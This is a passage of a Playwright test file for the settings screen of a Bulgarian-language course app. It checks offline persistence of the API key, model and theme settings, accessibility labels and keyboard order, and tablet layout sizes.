      ...readdirSync(new URL('../../src/', import.meta.url)).filter((f) => f.endsWith('.js')).map((f) => `src/${f}`),
      ...readdirSync(new URL('../../src/screens/', import.meta.url)).filter((f) => f.endsWith('.js')).map((f) => `src/screens/${f}`),
    ].sort();
    expect(shell).toEqual(files);
    await context.setOffline(true);
    try {
      await page.reload();
      await openSettings(page);
      await expect(field(page, 'version')).not.toHaveText('');
      await saveKey(page);
      await field(page, 'model').selectOption('claude-opus-5-5');
      await page.locator('#settings-theme-dark').check();
      await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
      await page.reload();
      await expect(screen(page)).toHaveAttribute('data-loaded', 'yes');
      await expect(field(page, 'model')).toHaveValue('claude-opus-5-5');
      await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
      // The theme is applied at start on every screen, not only on "Настройки".
      await page.goto('./#/');
      await page.reload();
      await expect(page.locator('[data-screen="courses"]')).toBeVisible();
      await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    } finally { await context.setOffline(false); }
  });

  test('accessibility: every control has a name; the reminder describes the key field; messages are live regions', async ({ page }) => {
    await openSettings(page);
    await expect(page.getByLabel('API ключ (Claude Console)')).toHaveAttribute('data-field', 'api-key');
    await expect(field(page, 'api-key')).toHaveAccessibleDescription(/Уроците никога не искат API ключ\. Въвеждай го само тук\./);
    await expect(page.getByLabel('Модел')).toHaveAttribute('data-field', 'model');
    await expect(page.getByLabel('Праг за разход')).toHaveAttribute('data-field', 'budget');
    for (const name of ['Покажи', 'Запази', 'Провери', 'Изтрий', 'По-малък текст', 'По-голям текст']) {
      await expect(page.getByRole('button', { name, exact: true })).toHaveCount(1);
    }
    const group = page.getByRole('radiogroup', { name: 'Тема' });
    await expect(group.getByRole('radio')).toHaveCount(3);
    for (const name of ['Като системата', 'Светла', 'Тъмна']) await expect(group.getByRole('radio', { name })).toHaveCount(1);
    await expect(field(page, 'key-message')).toHaveAttribute('aria-live', 'polite');
    await expect(field(page, 'key-show')).toHaveAttribute('aria-controls', 'settings-api-key');
    // Keyboard: Tab from the key field reaches "Покажи" and "Запази" in that order.
    await field(page, 'api-key').focus();
    await page.keyboard.press('Tab');
    await expect(field(page, 'key-show')).toBeFocused();
    await page.keyboard.press('Tab');
    await expect(field(page, 'key-save')).toBeFocused();
    // Every id that aria-describedby names exists.
    const missing = await page.evaluate(() => [...document.querySelectorAll('[aria-describedby],[aria-controls],label[for]')]
      .flatMap((el) => (el.getAttribute('aria-describedby') || el.getAttribute('aria-controls') || el.getAttribute('for')).split(/\s+/))
      .filter((id) => id && !document.getElementById(id)));
    expect(missing).toEqual([]);
  });

  for (const size of [{ width: 1920, height: 1200 }, { width: 1280, height: 800 }]) {
    test(`layout ${size.width}×${size.height}: no sideways scroll, ≥ 44 px targets, the reminder right by the key field`, async ({ page }, info) => {
      test.skip(info.project.name !== 'tablet-landscape', 'landscape sizes');
      await page.setViewportSize(size);
      await openSettings(page);
      await saveKey(page);
      await field(page, 'key-check').click().catch(() => {});
      expect(await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)).toBeLessThanOrEqual(0);
      for (const name of ['api-key', 'key-show', 'key-save', 'key-check', 'key-delete', 'model', 'budget', 'font-smaller', 'font-bigger']) {
        const box = await field(page, name).boundingBox();
        expect(box.height, name).toBeGreaterThanOrEqual(44);
        expect(box.x + box.width, name).toBeLessThanOrEqual(size.width);
      }
      const input = await field(page, 'api-key').boundingBox();
      const warn = await field(page, 'key-warning').boundingBox();
      expect(warn.y - (input.y + input.height)).toBeLessThan(120);
      expect(warn.y - (input.y + input.height)).toBeGreaterThanOrEqual(0);
      // Theme radios are hit targets too.
      for (const t of ['system', 'light', 'dark']) {
        const b = await page.locator(`label[for="settings-theme-${t}"]`).boundingBox();
        expect(b.height, t).toBeGreaterThanOrEqual(44);
      }
      await page.screenshot({ path: `/tmp/t051shots/settings-${size.width}x${size.height}.png`, fullPage: true });
    });
  }
});
